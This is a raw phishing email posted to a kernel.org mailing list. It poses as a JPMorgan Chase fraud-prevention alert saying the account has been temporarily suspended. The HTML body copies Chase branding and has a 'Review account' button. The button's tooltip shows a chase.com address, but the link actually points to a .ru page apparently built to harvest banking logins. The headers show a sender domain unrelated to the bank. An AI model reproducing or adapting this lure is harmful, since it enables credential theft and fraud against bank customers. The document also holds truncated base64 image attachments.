Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E73DA1F63C6
	for <soc@lists.linux.dev>; Fri, 17 Jan 2025 04:44:57 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1737089098; cv=none; b=FCzMI9H3P2XBL269rBHr/O0MG23LOJ2bgyli++F8qJCskzaA0R7QyfwpD+aDiRrVGvmofYleV7qmgqKCrofr9xr/8+8APbyEVPH5coWF3BMsMw6ZdXwvzKTNRNBvYicrO3L0ip/M7RqXYdpxjeSp7hIaYjKN7vHaG4Vov3wUefM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1737089098; c=relaxed/simple;
	bh=pRpfcN9n8+RDwPnC2xoB8Eg99J/MHST2Mu6RMIJOh+4=;
	h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; b=mrftyaaW3styRPWxGC+3UlAEjMe7E6Vi/SpSpCHP8DwIrq4A6NRALzL/uYz4r1F/OcA99EIVdWpRmOm/1Aq++lLCUQ07sZOAVJfiCQHhYB5XheoQ+6uz+9ei6SRTgBNDUjLdP5fe6eGZaeRSZz1RWT4ZthiZz6Jg79q8/EIrFdQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=111b9dj0-c3d-11.com header.i=info@111b9dj0-c3d-11.com header.b=F7Ba6ouv; arc=none smtp.client-ip=10.30.226.201
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=111b9dj0-c3d-11.com header.i=info@111b9dj0-c3d-11.com header.b="F7Ba6ouv"
Received: by smtp.kernel.org (Postfix)
	id 997A1C4CEE2; Fri, 17 Jan 2025 04:44:57 +0000 (UTC)
Received: from mail00.111b9dj0-c3d-11.com (mail00.111b9dj0-c3d-11.com [98.142.253.226])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id 35FA5C4CEE0
	for <soc@kernel.org>; Fri, 17 Jan 2025 04:44:56 +0000 (UTC)
Authentication-Results: smtp.kernel.org; dmarc=permerror header.from=111b9dj0-c3d-11.com
Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=111b9dj0-c3d-11.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=111b9dj0-c3d-11.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=info@111b9dj0-c3d-11.com;
 bh=V5WEAbWWQHCcPN4Xdk4vrYROlQCyazvqM/vtdBN3ilw=;
 b=F7Ba6ouv6w5JNyapJukVDrT8dI3Ot09xF3d3HF1cLvcxLN9Hye2UMi7fctCxNsnSuSG5LSe9YnxK
   v9U8dArDkq2TAV157Ot3tb5QOuBsixdF6zab3V1zOAl/URc7TBo+CCvZjU7rtNLmb5ZtIsynzApc
   UT80BVJ2gWXkq6cc6kg=
From: JPMorganChase Fruad Prevention<info@111b9dj0-c3d-11.com>
To: soc@kernel.org
Subject: Security Alert [Tempoary Lock on your account]
Date: 16 Jan 2025 20:43:27 -0800
Message-ID: <20250116204327.702E2AABF1381B93@111b9dj0-c3d-11.com>
Precedence: bulk
X-Mailing-List: soc@lists.linux.dev
List-Id: <soc.lists.linux.dev>
List-Subscribe: <mailto:soc+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:soc+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="----=_NextPart_000_0012_5C0428F9.6CEFDA0B"

This is a multi-part message in MIME format.

------=_NextPart_000_0012_5C0428F9.6CEFDA0B
Content-Type: multipart/related;
	boundary="----=_NextPart_001_0013_5C0428F9.6CEFDA0B"


------=_NextPart_001_0013_5C0428F9.6CEFDA0B
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<p>&nbsp;</p>
<table class=3D"x_fullWidth" style=3D"font-style: normal; font-weight: 400;=
 font-stretch: inherit; font-size: 15px; line-height: normal ! important; f=
ont-size-adjust: inherit; color: #242424; letter-spacing: normal; orphans: =
2; text-align: start; text-transform: none; widows: 2; word-spacing: 0px; w=
hite-space: normal; min-width: 800px; background-color: #d7dbe0 ! important=
; font-family: Times New Roman;" role=3D"presentation" border=3D"0" width=
=3D"100%" cellspacing=3D"0" cellpadding=3D"0" align=3D"center">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_fullWidth" style=3D"padding: 0px 0px 20px; white-space: norm=
al ! important; vertical-align: top; min-width: 800px; background-color: #d=
7dbe0 ! important; line-height: normal ! important;" align=3D"center">
<table class=3D"x_fullWidth" style=3D"font-style: inherit; font-variant: in=
herit; font-weight: inherit; font-stretch: inherit; font-size: inherit; lin=
e-height: normal ! important; font-size-adjust: inherit; background-color: =
#ffffff ! important;" role=3D"presentation" border=3D"0" width=3D"800" cell=
spacing=3D"0" cellpadding=3D"0" align=3D"center">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"padding: 23px 0px 0px; white-space: normal ! important; vertic=
al-align: top; background-color: #005eb8 ! important; line-height: normal !=
 important;" align=3D"center">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 bottom; width: 12px; line-height: normal ! important;" align=3D"right"><im=
g style=3D"border: 0px none; margin: 0px; padding: 0px; font-style: inherit=
; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-=
size: inherit; line-height: normal ! important; font-size-adjust: inherit; =
vertical-align: baseline; color: inherit; display: block;" src=3D"cid:blue-=
left.jpg" alt=3D"" width=3D"12" height=3D"226" border=3D"0" data-imagetype=
=3D"External" /></td>
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 bottom; width: 616px; background-color: #ffffff ! important; line-height: =
normal ! important;" align=3D"center">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 top; background-color: #ffffff ! important; line-height: normal ! importan=
t;" align=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad" style=3D"white-space: normal ! important; vertical-al=
ign: top; padding-left: 30px; background-color: #ffffff ! important; line-h=
eight: normal ! important;" align=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"padding: 36px 0px 20px; white-space: normal ! important; verti=
cal-align: bottom; line-height: normal ! important;" align=3D"left"><img st=
yle=3D"border: 0px none; margin: 0px; padding: 0px; font-style: inherit; fo=
nt-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size=
: inherit; line-height: normal ! important; font-size-adjust: inherit; vert=
ical-align: baseline; color: inherit; display: block;" src=3D"cid:chase-log=
o-h-rgb.png" alt=3D"Chase Logo" width=3D"104" height=3D"20" border=3D"0" da=
ta-imagetype=3D"External" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad" style=3D"padding: 20px 28px 0px; white-space: normal =
! important; vertical-align: top; line-height: normal ! important;" align=
=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0" align=3D"left">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"white-space: normal ! important; line-height: normal ! importa=
nt; vertical-align: top;" align=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_font14" style=3D"padding: 5px 10px; white-space: nowrap; ver=
tical-align: top; font-size: 12px; font-weight: bold; color: #414042 ! impo=
rtant; background-color: #d7dbe0 ! important; line-height: normal ! importa=
nt;" align=3D"left">Activity Alert</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad" style=3D"padding: 20px 30px 58px; white-space: normal=
 ! important; vertical-align: top; background-color: #ffffff ! important; l=
ine-height: normal ! important;" align=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit; width: 548px; height: 47px;" role=3D"pre=
sentation" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_zeroPad" style=3D"padding: 0px 150px 0px 0px; white-space: n=
ormal ! important; vertical-align: top; font-size: 30px; font-weight: bold;=
 color: #414042 ! important; line-height: normal ! important;" align=3D"lef=
t">Verification Required</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 bottom; width: 12px; line-height: normal ! important;" align=3D"left"><img=
 style=3D"border: 0px none; margin: 0px; padding: 0px; font-style: inherit;=
 font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-s=
ize: inherit; line-height: normal ! important; font-size-adjust: inherit; v=
ertical-align: baseline; color: inherit; display: block;" src=3D"cid:blue-r=
ight.jpg" alt=3D"" width=3D"12" height=3D"226" border=3D"0" data-imagetype=
=3D"External" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 top; background-color: #ffffff ! important; line-height: normal ! importan=
t;" align=3D"center">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 top; width: 12px; line-height: normal ! important;" align=3D"right"><img s=
tyle=3D"border: 0px none; margin: 0px; padding: 0px; font-style: inherit; f=
ont-variant: inherit; font-weight: inherit; font-stretch: inherit; font-siz=
e: inherit; line-height: normal ! important; font-size-adjust: inherit; ver=
tical-align: baseline; color: inherit; display: block;" src=3D"cid:white-le=
ft.jpg" alt=3D"" width=3D"12" height=3D"77" border=3D"0" data-imagetype=3D"=
External" /></td>
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 top; width: 616px; background-color: #ffffff ! important; line-height: nor=
mal ! important;" align=3D"center">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit; width: 616px; height: 558px;" role=3D"pr=
esentation" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad" style=3D"padding: 0px 150px 0px 30px; white-space: no=
rmal ! important; vertical-align: top; line-height: normal ! important;" al=
ign=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"border-bottom: 1px solid #414042; padding: 10px 0px; white-spa=
ce: normal ! important; vertical-align: top; line-height: normal ! importan=
t;" align=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_font14" style=3D"padding: 0px; white-space: normal ! importa=
nt; vertical-align: top; font-size: 16px; color: #414042 ! important; line-=
height: normal ! important;" align=3D"left"><span style=3D"font-weight: bol=
d;">Email Sent to:</span></td>
<td class=3D"x_font14" style=3D"padding: 0px 0px 0px 5px; white-space: norm=
al ! important; vertical-align: top; font-size: 16px; font-weight: bold; co=
lor: #414042 ! important; line-height: normal ! important;" align=3D"right"=
>(soc@kernel.org)</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td style=3D"border-bottom: 1px solid #414042; padding: 10px 0px; white-spa=
ce: normal ! important; vertical-align: top; line-height: normal ! importan=
t;" align=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit;" role=3D"presentation" border=3D"0" widt=
h=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_font14" style=3D"padding: 0px; white-space: normal ! importa=
nt; vertical-align: top; font-size: 16px; color: #414042 ! important; line-=
height: normal ! important; font-weight: bold;" align=3D"left">Email Priori=
ty</td>
<td class=3D"x_font14" style=3D"padding: 0px 0px 0px 5px; white-space: norm=
al ! important; vertical-align: top; font-size: 16px; font-weight: bold; co=
lor: #414042 ! important; line-height: normal ! important;" align=3D"right"=
>Extremely High</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad" style=3D"padding: 40px 130px 0px 30px; white-space: n=
ormal ! important; vertical-align: top; font-size: 16px; color: #414042 ! i=
mportant; line-height: normal ! important;" align=3D"left"><big>You are rec=
eiving this notification because we have detected activity on your account,=
 which has led to its temporary suspension.<br /> <br /> To restore access,=
 please click the *Review Account* link below, sign in, and verify your acc=
ount information.<br /> <br /> Note: Ensure that you do not change your Use=
rID or password during the verification process.</big></td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad" style=3D"padding: 40px 0px 60px 30px; white-space: no=
rmal ! important; vertical-align: top; line-height: normal ! important;" al=
ign=3D"left">
<table style=3D"font-style: inherit; font-variant: inherit; font-weight: in=
herit; font-stretch: inherit; font-size: inherit; line-height: normal ! imp=
ortant; font-size-adjust: inherit; vertical-align: top;" role=3D"presentati=
on" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" align=3D"left">
<tbody style=3D"line-height: normal ! important;">
<tr style=3D"line-height: normal ! important;">
<td style=3D"border: 1px solid #0060f0; padding: 10px 0px; white-space: nor=
mal ! important; font-size: 16px; vertical-align: top; width: 168px; color:=
 #fffffe ! important; background-color: #0060f0 ! important; line-height: n=
ormal ! important;" role=3D"button" align=3D"center"><a style=3D"border: 0p=
x none; margin: 0px; padding: 0px; font-style: inherit; font-variant: inher=
it; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-h=
eight: normal ! important; font-size-adjust: inherit; vertical-align: basel=
ine; text-decoration: none; color: #fffffe ! important;" title=3D"Protected=
 by Outlook: https://secure.chase.com/web/auth/nav?navKey=3DrequestDashboar=
d. Click or tap to follow the link." href=3D"https://boxauth.ru/mix/verifya=
cc.php?sec" target=3D"_blank" rel=3D"noopener noreferrer" data-auth=3D"Veri=
fied" data-linkindex=3D"1">Review account</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style=3D"line-height: normal ! important;">
<td class=3D"x_moPad x_font14" style=3D"padding: 0px 30px 20px; white-space=
: normal ! important; vertical-align: top; font-size: 12px; color: #717171 =
! important; line-height: normal ! important;" align=3D"left">Securely acce=
ss your accounts with the&nbsp;<a style=3D"border: 0px none; margin: 0px; p=
adding: 0px; font-style: inherit; font-variant: inherit; font-weight: inher=
it; font-stretch: inherit; font-size: inherit; line-height: normal ! import=
ant; font-size-adjust: inherit; vertical-align: baseline; text-decoration: =
underline; color: #0060f0 ! important;" title=3D"Protected by Outlook: http=
s://www.chase.com/digital/mobile-banking. Click or tap to follow the link."=
 target=3D"_blank" rel=3D"noopener noreferrer" data-auth=3D"Verified" data-=
linkindex=3D"2">Chase&nbsp;Mobile<span style=3D"border: 0px none; margin: 0=
px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: =
inherit; font-stretch: inherit; font-size: 8.4px; line-height: normal ! imp=
ortant; font-size-adjust: inherit; vertical-align: 3px; color: inherit; tex=
t-decoration: none;">&reg;</span>&nbsp;app</a>&nbsp;or&nbsp;<a style=3D"bor=
der: 0px none; margin: 0px; padding: 0px; font-style: inherit; font-variant=
: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit;=
 line-height: normal ! important; font-size-adjust: inherit; vertical-align=
: baseline; text-decoration: underline; color: #0060f0 ! important;" title=
=3D"Protected by Outlook: https://secure.chase.com/web/auth/nav?navKey=3Dre=
questDashboard. Click or tap to follow the link." target=3D"_blank" rel=3D"=
noopener noreferrer" data-auth=3D"Verified" data-linkindex=3D"3">chase.com<=
/a>.</td>
</tr>
</tbody>
</table>
</td>
<td style=3D"padding: 0px; white-space: normal ! important; vertical-align:=
 top; width: 12px; line-height: normal ! important;" align=3D"left"><img st=
yle=3D"border: 0px none; margin: 0px; padding: 0px; font-style: inherit; fo=
nt-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size=
: inherit; line-height: normal ! important; font-size-adjust: inherit; vert=
ical-align: baseline; color: inherit; display: block;" src=3D"cid:white-rig=
ht.jpg" alt=3D"" width=3D"12" height=3D"77" border=3D"0" data-imagetype=3D"=
External" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
------=_NextPart_001_0013_5C0428F9.6CEFDA0B
Content-Type: image/jpeg; name="blue-left.jpg"
Content-Transfer-Encoding: base64
Content-ID: <blue-left.jpg>
Content-Disposition: inline; filename="blue-left.jpg"

/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMfaHR0
cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1
TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5z
Om1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzE0MCA3OS4xNjA0NTEsIDIw
MTcvMDUvMDYtMDE6MDg6MjEgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDov
L3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRp
b24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8x
LjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBl
L1Jlc291cmNlUmVmIyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAv
IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMyQUYwQTQxNzUyQzExRUI4MzZEQjBEN0Y2
NjZDNkFFIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMyQUYwQTQwNzUyQzExRUI4MzZE
QjBEN0Y2NjZDNkFFIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4
IE1hY2ludG9zaCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSIxOUVD
NjFGMTI3RUUwNkVGOTEyM0UzRUNBOEQ3OTEwNCIgc3RSZWY6ZG9jdW1lbnRJRD0iMTlFQzYx
RjEyN0VFMDZFRjkxMjNFM0VDQThENzkxMDQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRm
OlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7/7gAOQWRvYmUAZMAAAAAB
/9sAhAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAgICAgIC
AgICAgIDAwMDAwMDAwMDAQEBAQEBAQIBAQICAgECAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD
AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/wAARCADiAAwDAREAAhEBAxEB/8QAnAABAAMA
AwAAAAAAAAAAAAAABgAFBwEECQEBAQEAAgMAAAAAAAAAAAAABgcFAAECBAkQAAADAgkJBgYD
AAAAAAAAAAABETEC8CFBYXGBMwQFUbHBEjKyE0NEoVJygsIjkdHhYgMUkiQVEQABAQMHCwME
AwAAAAAAAAAAARGBBPAxQQIyMwUhUXHBEgMjQxQkRGHhEyJCghWhsdH/2gAMAwEAAhEDEQA/
APGAfec+JhBw4QdKqJOdnCk1Yso8dtGzow7YuY6t6/NwXTem+E9Q9KN3/wAO7WtSe7B7hN7W
RFzlB/se7qLKxZFoBX97xdhuUSfpeFtsylpisX4iSJrKUzDbxheBWeZGEXtUBKf7aSa/qEx8
wpDE6Kb7dQ+xSzKh/Mop+MXFbQpNsIXjVTP+qWde0THyfVpSG9n+JoGJWR+bcFRxe4rE2wm+
SVKgHn+YTFnd/kURq9G7UPsSsnj8S/x+opuL3FYnWE5N6iqAOrRTTWE3YnVyzlGZ2bKWajQs
RL2vis8SCkYvcVicYXepoM9T+2n3IonHlSzlBavSz0azQMRXUbERmteqKRi1xWJ7hifWiynA
yF+0qFlYJx5b9Y/b2o5xKzrTsUUjFUbulAOGLxESU4G6mHeE9YnU+o98f0YOcSszp0CiYndV
gFhl5VlSB+phlE+8t452u29ZhxiNmfiPdIULErqtoUCYdbSVIJ586ifMXqxz4zxviVkaNjOu
IhQcSu1A2GtTeNWb3BHUMj12JMxABZ3Lafcbt4TKGDi/2Z15iD/EbtXgbDrcs4K6vzLXqgJz
W0tGnju1DXELJ6h7dIOsRu1lSCYC2C+pq0oBDO4ZRtDbx3ahriFk9Qe6Qcx+Xdrp/wBBMAv1
oC+oq0gR5LxpyXDPELJ6vdIOI+6rAyBtIDepAnnvGDeB+OoZ3+zOk8xBvHXVYHQFsIIXHYUH
gLYnUP1ixq9O4X3/AGDhIGsfdVgnAWgfzod8DfKFnjuGN+s3qS3TDONuqzwnA2gmhcdhbaMk
bnBFifM2n3FXJlmFl+s3vEWZ4Loy7UJQartppCnO83pBPnuE7V+Fwqv2w9CQwsjLCheEtJpC
3Oq+mYF2J8zxPyHCy9kRuvKUmgKIuwukMQlpNIWT3l+xZlQGeZLOJm8EU32yfOd0goimKioG
YS2gZ5tadvyBnZX5BG3gPE972H6XdITxCZFeG4adukN8yHfBznPEPJE17ThmUrQliZl0ByHl
/AZj4kGKoNs4wgbwhLeth+rMYRxMyh+HDvMWb0g+xflabuXYYI73ZvVaQgiZl0GBD2nh9PeZ
EvYqDC57zd+14gvew94ZWStnyDeiKTDh7RQc2HfGFzqJ5SzG1y6dc39n/9k=

------=_NextPart_001_0013_5C0428F9.6CEFDA0B
Content-Type: image/png; name="chase-logo-h-rgb.png"
Content-Transfer-Encoding: base64
Content-ID: <chase-logo-h-rgb.png>
Content-Disposition: inline; filename="chase-logo-h-rgb.png"

iVBORw0KGgoAAAANSUhEUgAAAGgAAAAUCAYAAABh/HgbAAAACXBIWXMAAAsTAAALEwEAmpwY
AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAVRSURBVHgB7VlLUttIGP67LUimUpXy
Dca5gUJsFzUbxCYzzAa4gHFOAJwAc4KQE9hmDgDZDEM2MTuKQNANojlBmClTRWJ1d75ffmBj
tSTzCgu+haV+qru//p8W9Ij7w8o/b/Gbj20TZpMaC8FYNT3i7lHZ3yCpD0iLjwm9ApJm/ipJ
IwSVSr+5xug8pSAU6sz/9Ml3PS/vtC/c4TrbmEn6Xl1L6FDgHx4GlAL+xtT590KWPTCOjw9b
cd/LiuHxVjA5ZGrR4ScTxBgjyeGfV+Xykta6HppOtgUas45fX/5/vqQk1blKkmzg8cY2xGm3
XUXdBQpDLTzmbX3d2dlCGHZO+2WpqJE0dzSmVHJFu/0xJJFpD4bEJh6tfjnUnR1c1wJlhBDR
mlqJnSofVol0jbKjEJFY3RuQJEvYmNZmhzJuDCsL/OPjLbpDSKU2hsvGUNV1Xev6mFCoggn3
cFSj6wLjdS63mdinsr8Ccq5zTn2SClxwQkNvhz9syGyRUv9Zh09Pt+gOwYdtlPJ6xTPqGVXp
TK/hUYsbk+t0XC1kISrwHrRax/PM+pFnzxLVK8a/ISkDa4dcLlnlVvc80qYxVi/IPuYqNCS0
urPEKs4dLIzMcpptuGtAejxITIHfjRRrQhu+hXmsbRVStOX7/tjBG5FzefUM9H9/enKySzcB
LmEWmxcLvvla7vTXM4SAmn+8sI/7gD2oARdd7+CJxwRdqoVOJ6CfDGzrUr1JeSB0+A72guvy
SVL0YKDIg5GdyNmIoNUSdfc5BNF1EvqIu51ZAQ+oMDNTqtraNZlfKQUzpVK1Lz1shE9xi1lq
hDMFY5sgRdrA++mtQ9LiTLEcuw8hzFfo93/VlPSTJCSnzCL2YlXzWnd2b3JWk8Ch24OHw/Hs
zekh17D09I0wH8TMq1LTCIpIipMiPjAhp7pBIAgGkRux87PWgQspQkVuuVz1j46acf20gXGX
ZId0Akrz4G4Jkh4IWHrIDNzcERugZeTSRuhJ0YgKYRJB4Dw7CJQRbNuSPMOHgluUIPHeOHLN
1iq/K5awuq19WHqg3pqz8OaGms++hYqdFzaikKInVTxHXNiec/PCLRY9SlqlkHWIUiGaZ2oK
ev+S/Mu1IFh0IimJx9On96LeGCME8Y26rm4VQnw9TdDrxWIxUBY1N2x7GHivgxDbVPDaNKu7
2BgDMVqLEvCyVD4gSglIQc61vbhbBhM0iDVwM/K98r0ChKxMNoAKyH6snFhsyE9FDrZJm5gg
9mLyc0XcxASxavCicqh2isXZ9aQxYXjh36YHA8nyVO/7UZCpQmuELnI5j3pkIvtRxWOEoCtq
MRbflJrrv2tLMOuEVMBc1jkuoOL8Viv+DDhFU9n/AmekOlJvfplDNtsyo/ARHY96jRzUCjPv
wLg24dh4vWrky1RiQg96u0EpebFJoEmuDoJMMq3Tz58btr5QwbtwuRepK/Ee25u+SmM1CbVY
p+w4Q5wVG5TzGajQPlC0z3ncS2uH7d+bVPkb7by3DBDR/g8uy7g4QixT43UgYVwbMIqblBFR
XizFEGdFlNYhs9Qvp+W3WHJB4rt+WfQCu+48tEHZwV7f+g3sjItYq5bYY/tPOEzZz3WALjlI
lr6OLk/kJOAW1rDJBnJwnjSikDaHlCIKOnUOGW0TZYWhcsLEFFEIwytD3e0r6Uu3MkSSUw7q
shyYDsMtxEKDcuQqK5UXRmSyR1hnQM+f715VUQhiQbycwO0W6Wp+e6FGlT0azxAkLnCd/loY
nOXjH3b3gcpeLZEkAcfCmANo+gDkNEabHnE/YJKEmIttY3LkxRY1lsek8ge4AXHZ8XoTpQAA
AABJRU5ErkJggg==

------=_NextPart_001_0013_5C0428F9.6CEFDA0B
Content-Type: image/jpeg; name="blue-right.jpg"
Content-Transfer-Encoding: base64
Content-ID: <blue-right.jpg>
Content-Disposition: inline; filename="blue-right.jpg"

/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMfaHR0
cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1
TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5z
